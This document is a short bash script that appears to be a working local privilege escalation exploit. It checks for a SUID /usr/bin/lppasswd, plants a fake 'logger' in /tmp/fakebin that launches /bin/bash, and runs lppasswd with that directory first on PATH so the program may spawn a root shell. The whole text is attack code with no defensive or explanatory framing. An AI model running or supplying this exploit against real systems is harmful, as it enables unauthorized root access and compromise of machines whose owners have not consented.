#!/bin/bash

echo "[+] Checking for vulnerable SUID binary: /usr/bin/lppasswd"
if [[ ! -u /usr/bin/lppasswd ]]; then
    echo "[-] /usr/bin/lppasswd is not SUID or doesn't exist"
    exit 1
fi

echo "[+] Creating fake binary to hijack PATH..."

# Step 1: Create a fake binary that spawns a shell
mkdir -p /tmp/fakebin
echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakebin/logger
chmod +x /tmp/fakebin/logger

# Step 2: Prepend /tmp/fakebin to PATH and run lppasswd
echo "[+] Hijacking PATH and running lppasswd..."
PATH=/tmp/fakebin:$PATH /usr/bin/lppasswd

# Step 3: Cleanup (optional)
# rm -rf /tmp/fakebin

